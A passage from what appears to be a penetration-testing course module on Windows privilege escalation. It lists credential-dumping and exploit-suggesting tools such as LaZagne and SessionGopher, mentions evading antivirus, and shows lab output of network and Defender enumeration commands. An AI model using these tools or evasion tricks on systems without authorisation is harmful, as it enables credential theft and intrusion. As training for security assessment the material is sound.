href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td><td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson">Watson</a></td><td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td><td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td><td>WES-NG is a tool based on the output of Windows&#39; <code>systeminfo</code> utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></td><td>We will use several tools from Sysinternals in our enumeration including <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>, and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td></tr></tbody></table>

<p>We can also find pre-compiled binaries of <code>Seatbelt</code> and <code>SharpUp</code> <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">here</a>, and standalone binaries of <code>LaZagne</code> <a href="https://github.com/AlessandroZ/LaZagne/releases/">here</a>. It is recommended that we always compile our tools from the source if using them in a client environment.</p>
<p>Note: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to <code>C:\Windows\Temp</code> because the <code>BUILTIN\Users</code> group has write access.</p>
<p>This is not an exhaustive list of tools available to us. Furthermore, we should strive to learn what each tool does if one does not work as expected, or we cannot load them onto the target system. Tools like the ones listed above are extremely useful in narrowing down our checks and focusing our enumeration. Enumerating a Windows system can be a daunting task with an immense amount of information to sift through and make sense of. Tools can make this process faster and also give us more output in an easy-to-read format. A disadvantage to this can be information overload, since some of these tools, such as <code>winPEAS</code>, return an incredible amount of information that is mostly not useful to us. Tools can be a double-edged sword. While they help speed up the enumeration process and provide us with highly detailed output, we could be working less efficiently if we do not know how to read the output or narrow it down to the most interesting data points. Tools can also produce false positives, so we must have a deep understanding of many possible privilege escalation techniques to troubleshoot when things go wrong or are not what they seem to be. Learning the enumeration techniques manually will help to ensure that we do not miss obvious flaws due to an issue with a tool, like a false negative or false positive.</p>
<p>Throughout this module, we will show manual enumeration techniques for the various examples we cover and tool output where applicable. Aside from the enumeration techniques, it is also vital to learn how to perform the exploitation steps manually and not rely on &quot;autopwn&quot; scripts or tools that we cannot control. It is fine (and encouraged!) to write our own tools/scripts to perform both enumeration and exploitation steps. Still, we should be confident enough in both phases to explain precisely what we are doing to our client at any stage in the process. We should also be able to operate in an environment where we cannot load tools (such as an air-gapped network or systems that do not have internet access or allow us to plug in an external device such as a USB flash drive).</p>
<p>These tools are not only beneficial for penetration testers but can also assist systems administrators with their jobs by helping to identify low-hanging fruit to fix before an assessment, periodically checking the security posture of a few machines, analyzing the impact of an upgrade or other changes, or performing an in-depth security review on a new gold image before deploying it into production. The tools and methods shown in this module can significantly benefit anyone in charge of systems administration, architecture, or internal security &amp; compliance.</p>
<p>Like with any automation, there can be risks to using these tools. Though rare, performing excessive enumeration could cause system instability or issues with a system (or systems) that are already known to be fragile. Furthermore, these tools are well known, and most (if not all) of them will be detected and blocked by common anti-virus solutions, and most certainly, by more advanced EDR products such as Cylance or Carbon Black. Let&#39;s look at the latest release of the <code>LaZagne</code> tool at the time of writing version <a href="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe">2.4.3</a>. Uploading the precompiled binary to Virus Total shows that 47/70 products detect it.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/VT\_detected2.png" alt="image"></p>
<p>We likely would have been caught on the spot if we were attempting to run this during an evasive engagement. During other assessments, we may encounter protections that we need to bypass to run our tools. Though out of scope for this module, we can use a variety of methods to get our tools past common AV products, such as removing comments, changing function names, encrypting the executable, etc. These techniques will be taught in a later module. We will assume that our target client has temporarily set Windows Defender on the hosts we are assessing not to block our activities for this module. They are looking for as many issues as possible and are not looking to test their defenses at this stage in the game.</p>
<h2 id="situational-awareness">Situational Awareness</h2>
<hr>
<p>When placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and time. We cannot function and react effectively without an understanding of our current surroundings. We require this information to make informed decisions about our next steps to operate proactively instead of reactively. When we land on a Windows or Linux system intending to escalate privileges next, there are several things we should always look for to plan out our next moves. We may find other hosts that we can access directly, protections in place that will need to be bypassed, or find that certain tools will not work against the system in question.</p>
<hr>
<h3 id="network-information">Network Information</h3>
<p>Gathering network information is a crucial part of our enumeration. We may find that the host is dual-homed and that compromising the host may allow us to move laterally into another part of the network that we could not access previously. Dual-homed means that the host or server belongs to two or more different networks and, in most cases, has several virtual or physical network interfaces. We should always look at <a href="https://en.wikipedia.org/wiki/Routing\_table">routing tables</a> to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp">arp</a> command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.</p>
<p>This network information may help directly or indirectly with our local privilege escalation. It may lead us down another path to a system that we can access or escalate privileges on or reveal information that we can use for lateral movement to further our access after escalating privileges on the current system.</p>
<p><strong>Interface(s), IP Address(es), DNS Information</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; ipconfig /<span class="hljs-keyword">all</span>

Windows IP Configuration

   Host Name . . . . . . . . . . . . : <span class="hljs-type">WINLPE</span>-SRV01
   Primary Dns Suffix  . . . . . . . :
   <span class="hljs-type">Node</span> <span class="hljs-keyword">Type</span> <span class="hljs-type">. </span>. . . . . . . . . . . : <span class="hljs-type">Hybrid</span>
   IP Routing Enabled. . . . . . . . : <span class="hljs-type">No</span>
   WINS Proxy Enabled. . . . . . . . : <span class="hljs-type">No</span>
   DNS Suffix Search List. . . . . . : .<span class="hljs-type">htb</span>

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">vmxnet3</span> Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-C5-<span class="hljs-number">4</span>B
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::f055:fefd:b1b:<span class="hljs-number">9919</span>%<span class="hljs-number">9</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-<span class="hljs-type">ED</span>-DB-<span class="hljs-number">68</span>-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">90</span>-<span class="hljs-number">94</span>
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .<span class="hljs-type">htb</span>
   Description . . . . . . . . . . . : <span class="hljs-type">Intel</span>(R) <span class="hljs-number">82574</span>L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-<span class="hljs-number">90</span>-<span class="hljs-number">94</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">Yes</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   IPv6 Address. . . . . . . . . . . : <span class="hljs-type">dead</span>:beef::e4db:<span class="hljs-number">5</span>ea3:<span class="hljs-number">2775</span>:<span class="hljs-number">8</span>d4d(Preferred)
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::e4db:<span class="hljs-number">5</span>ea3:<span class="hljs-number">2775</span>:<span class="hljs-number">8</span>d4d%<span class="hljs-number">4</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.43.8(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : <span class="hljs-type">Thursday</span>, March <span class="hljs-number">25</span>, <span class="hljs-number">2021</span> <span class="hljs-number">9</span>:<span class="hljs-number">24</span>:<span class="hljs-number">45</span> AM
   Lease Expires . . . . . . . . . . : <span class="hljs-type">Monday</span>, March <span class="hljs-number">29</span>, <span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">28</span>:<span class="hljs-number">44</span> PM
   Default Gateway . . . . . . . . . : <span class="hljs-type">fe80</span>::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:<span class="hljs-number">4</span>ddf%<span class="hljs-number">4</span>
                                       <span class="hljs-number">10.129</span>.<span class="hljs-number">0.1</span>
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-<span class="hljs-type">ED</span>-DB-<span class="hljs-number">68</span>-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">90</span>-<span class="hljs-number">94</span>
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : <span class="hljs-type">Media</span> disconnected
   Connection-specific DNS Suffix  . : .<span class="hljs-type">htb</span>
   Description . . . . . . . . . . . : <span class="hljs-type">Microsoft</span> ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-<span class="hljs-type">E0</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>

Tunnel adapter Teredo Tunneling Pseudo-<span class="hljs-keyword">Interface</span>:

   Media State . . . . . . . . . . . : <span class="hljs-type">Media</span> disconnected
   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">Teredo</span> Tunneling Pseudo-<span class="hljs-keyword">Interface</span>
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-<span class="hljs-type">E0</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>

Tunnel adapter isatap.{<span class="hljs-number">02</span>D6F04C-A625-<span class="hljs-number">49</span>D1-A85D-<span class="hljs-number">4</span>FB454FBB3DB}:

   Media State . . . . . . . . . . . : <span class="hljs-type">Media</span> disconnected
   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">Microsoft</span> ISATAP Adapter #<span class="hljs-number">2</span>
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-<span class="hljs-type">E0</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
</code></pre>
<p><strong>ARP Table</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">arp</span> <span class="hljs-selector-tag">-a</span>

<span class="hljs-selector-tag">Interface</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span> <span class="hljs-selector-tag">---</span> 0<span class="hljs-selector-tag">x4</span>
  <span class="hljs-selector-tag">Internet</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Type</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>            00<span class="hljs-selector-tag">-50-56-b9-4d-df</span>     <span class="hljs-selector-tag">dynamic</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.12</span>          00<span class="hljs-selector-tag">-50-56-b9-da-ad</span>     <span class="hljs-selector-tag">dynamic</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.13</span>          00<span class="hljs-selector-tag">-50-56-b9-5b-9f</span>     <span class="hljs-selector-tag">dynamic</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span>        <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.22</span>            01<span class="hljs-selector-tag">-00-5e-00-00-16</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.252</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fc</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.253</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fd</span>     <span class="hljs-selector-tag">static</span>
  239<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.250</span>       01<span class="hljs-selector-tag">-00-5e-7f-ff-fa</span>     <span class="hljs-selector-tag">static</span>
  255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span>       <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>

<span class="hljs-selector-tag">Interface</span>: 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.56</span> <span class="hljs-selector-tag">---</span> 0<span class="hljs-selector-tag">x9</span>
  <span class="hljs-selector-tag">Internet</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Type</span>
  192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.255</span>        <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.22</span>            01<span class="hljs-selector-tag">-00-5e-00-00-16</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.252</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fc</span>     <span class="hljs-selector-tag">static</span>
  239<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.250</span>       01<span class="hljs-selector-tag">-00-5e-7f-ff-fa</span>     <span class="hljs-selector-tag">static</span>
  255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span>       <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>
</code></pre>
<p><strong>Routing Table</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; route print

===========================================================================
Interface List
  <span class="hljs-number">9</span>...<span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">56</span> b9 c5 4b ......vmxnet3 Ethernet Adapter
  <span class="hljs-number">4</span>...<span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">56</span> b9 <span class="hljs-number">90</span> <span class="hljs-number">94</span> ......Intel(R) 82574L Gigabit Network Connection
  <span class="hljs-number">1</span>...........................Software Loopback Interface <span class="hljs-number">1</span>
  <span class="hljs-number">3</span>...<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 Microsoft ISATAP Adapter
  <span class="hljs-number">5</span>...<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 Teredo Tunneling Pseudo-Interface
 <span class="hljs-number">13</span>...<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 Microsoft ISATAP Adapter #<span class="hljs-number">2</span>
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>       <span class="hljs-number">10.129</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>      <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>     <span class="hljs-number">25</span>
          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.1</span>    <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
       <span class="hljs-number">10.129</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>      <span class="hljs-number">255.255</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         On-link       <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>    <span class="hljs-number">281</span>
      <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link       <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>    <span class="hljs-number">281</span>
   <span class="hljs-number">10.129</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link       <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>    <span class="hljs-number">281</span>
        <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>        <span class="hljs-number">255.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         On-link         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>    <span class="hljs-number">331</span>
        <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>    <span class="hljs-number">331</span>
  <span class="hljs-number">127.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>    <span class="hljs-number">331</span>
     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.0</span>    <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.0</span>         On-link     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
    <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
   <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
        <span class="hljs-number">224.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>        <span class="hljs-number">240.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         On-link         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>    <span class="hljs-number">331</span>
        <span class="hljs-number">224.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>        <span class="hljs-number">240.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         On-link       <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>    <span class="hljs-number">281</span>
        <span class="hljs-number">224.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>        <span class="hljs-number">240.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         On-link     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>    <span class="hljs-number">331</span>
  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link       <span class="hljs-number">10.129</span><span class="hljs-meta">.43</span><span class="hljs-meta">.8</span>    <span class="hljs-number">281</span>
  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>  <span class="hljs-number">255.255</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>         On-link     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.56</span>    <span class="hljs-number">271</span>
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>     <span class="hljs-number">192.168</span><span class="hljs-meta">.20</span><span class="hljs-meta">.1</span>  <span class="hljs-meta">Default</span>
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> ::/<span class="hljs-number">0</span>                     fe80::<span class="hljs-number">250</span>:56ff:feb9:4ddf
  <span class="hljs-number">1</span>    <span class="hljs-number">331</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span>                  On-link
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> dead:beef::/<span class="hljs-number">64</span>           On-link
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> dead:beef::e4db:5ea3:<span class="hljs-number">2775</span>:8d4d/<span class="hljs-number">128</span>
                                    On-link
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> fe80::/<span class="hljs-number">64</span>                On-link
  <span class="hljs-number">9</span>    <span class="hljs-number">271</span> fe80::/<span class="hljs-number">64</span>                On-link
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> fe80::e4db:5ea3:<span class="hljs-number">2775</span>:8d4d/<span class="hljs-number">128</span>
                                    On-link
  <span class="hljs-number">9</span>    <span class="hljs-number">271</span> fe80::f055:fefd:b1b:<span class="hljs-number">9919</span>/<span class="hljs-number">128</span>
                                    On-link
  <span class="hljs-number">1</span>    <span class="hljs-number">331</span> ff00::/<span class="hljs-number">8</span>                 On-link
  <span class="hljs-number">4</span>    <span class="hljs-number">281</span> ff00::/<span class="hljs-number">8</span>                 On-link
  <span class="hljs-number">9</span>    <span class="hljs-number">271</span> ff00::/<span class="hljs-number">8</span>                 On-link
===========================================================================
Persistent Routes:
  None
</code></pre>
<hr>
<h3 id="enumerating-protections">Enumerating Protections</h3>
<p>Most modern environments have some sort of anti-virus or Endpoint Detection and Response (EDR) service running to monitor, alert on, and block threats proactively. These tools may interfere with the enumeration process. They will very likely present some sort of challenge during the privilege escalation process, especially if we are using some kind of public PoC exploit or tool. Enumerating protections in place will help us ensure that we are using methods that are not being blocked or detected and will help us if we have to craft custom payloads or modify tools before compiling them.</p>
<p>Many organizations utilize some sort of application whitelisting solution to control what types of applications and files certain users can run. This may be used to attempt to block non-admin users from running <code>cmd.exe</code> or <code>powershell.exe</code> or other binaries and file types not needed for their day-to-day work. A popular solution offered by Microsoft is <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a>. We can use the <a href="https://docs.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps">GetAppLockerPolicy</a> cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. This will help us see what binaries or file types may be blocked and whether we will have to perform some sort of AppLocker bypass either during our enumeration or before running a tool or technique to escalate privileges.</p>
<p>In a real-world engagement, the client will likely have protections in place that detect the most common tools/scripts (including those introduced in the previous section). There are ways to deal with these, and enumerating the protections in use can help us modify our tools in a lab environment and test them before using them against a client system. Some EDR tools detect on or even block usage of common binaries such as <code>net.exe</code>, <code>tasklist</code>, etc. Organizations may restrict what binaries a user can run or immediately flag suspicious activities, such as an accountant&#39;s machine showing specific binaries being run via cmd.exe. Early enumeration and a deep understanding of the client&#39;s environment and workarounds against common AV and EDR solutions can save us time during a non-evasive engagement and make or break an evasive engagement.</p>
<p><strong>Check Windows Defender Status</strong></p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-MpComputerStatus

<span class="hljs-string">AMEngineVersion                 :</span> <span class="hljs-number">1.1</span><span class="hljs-number">.17900</span><span class="hljs-number">.7</span>
<span class="hljs-string">AMProductVersion                :</span> <span class="hljs-number">4.10</span><span class="hljs-number">.14393</span><span class="hljs-number">.2248</span>
<span class="hljs-string">AMServiceEnabled                :</span> True
<span class="hljs-string">AMServiceVersion                :</span> <span class="hljs-number">4.10</span><span class="hljs-number">.14393</span><span class="hljs-number">.2248</span>
<span class="hljs-string">AntispywareEnabled              :</span> True
<span class="hljs-string">AntispywareSignatureAge         :</span> <span class="hljs-number">1</span>
<span class="hljs-string">AntispywareSignatureLastUpdated :</span> <span class="hljs-number">3</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2021</span> <span class="hljs-number">2</span>:<span class="hljs-number">59</span>:<span class="hljs-number">13</span> AM
<span class="hljs-string">AntispywareSignatureVersion     :</span> <span class="hljs-number">1.333</span><span class="hljs-number">.1470</span><span class="hljs-number">.0</span>
<span class="hljs-string">AntivirusEnabled                :</span> True
<span class="hljs-string">AntivirusSignatureAge           :</span> <span class="hljs-number">1</span>
<span class="hljs-string">AntivirusSignatureLastUpdated   :</span> <span class="hljs-number">3</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2021</span> <span class="hljs-number">2</span>:<span class="hljs-number">59</span>:<span class="hljs-number">12</span> AM
<span class="hljs-string">AntivirusSignatureVersion       :</span> <span class="hljs-number">1.333</span><span class="hljs-number">.1470</span><span class="hljs-number">.0</span>
<span class="hljs-string">BehaviorMonitorEnabled          :</span> False
<span class="hljs-string">ComputerID                      :</span> <span class="hljs-number">54</span>AF7DE4<span class="hljs-number">-3</span>C7E<span class="hljs-number">-4</span>DA0<span class="hljs-number">-87</span>AC<span class="hljs-number">-831</span>B045B9063
<span class="hljs-string">ComputerState                   :</span> <span class="hljs-number">0</span>
<span class="hljs-string">FullScanAge                     :</span> <span class="hljs-number">4294967295</span>
<span class="hljs-string">FullScanEndTime                 :</span>
<span class="hljs-string">FullScanStartTime               :</span>
<span class="hljs-string">IoavProtectionEnabled           :</span> False
<span class="hljs-string">LastFullScanSource              :</span> <span class="hljs-number">0</span>
<span class="hljs-string">LastQuickScanSource             :</span> <span class="hljs-number">0</span>
<span class="hljs-string">NISEnabled                      :</span> False
<span class="hljs-string">NISEngineVersion                :</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-string">NISSignatureAge                 :</span> <span class="hljs-number">4294967295</span>
<span class="hljs-string">NISSignatureLastUpdated         :</span>
<span class="hljs-string">NISSignatureVersion             :</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-string">OnAccessProtectionEnabled       :</span> False
<span class="hljs-string">QuickScanAge                    :</span> <span class="hljs-number">4294967295</span>
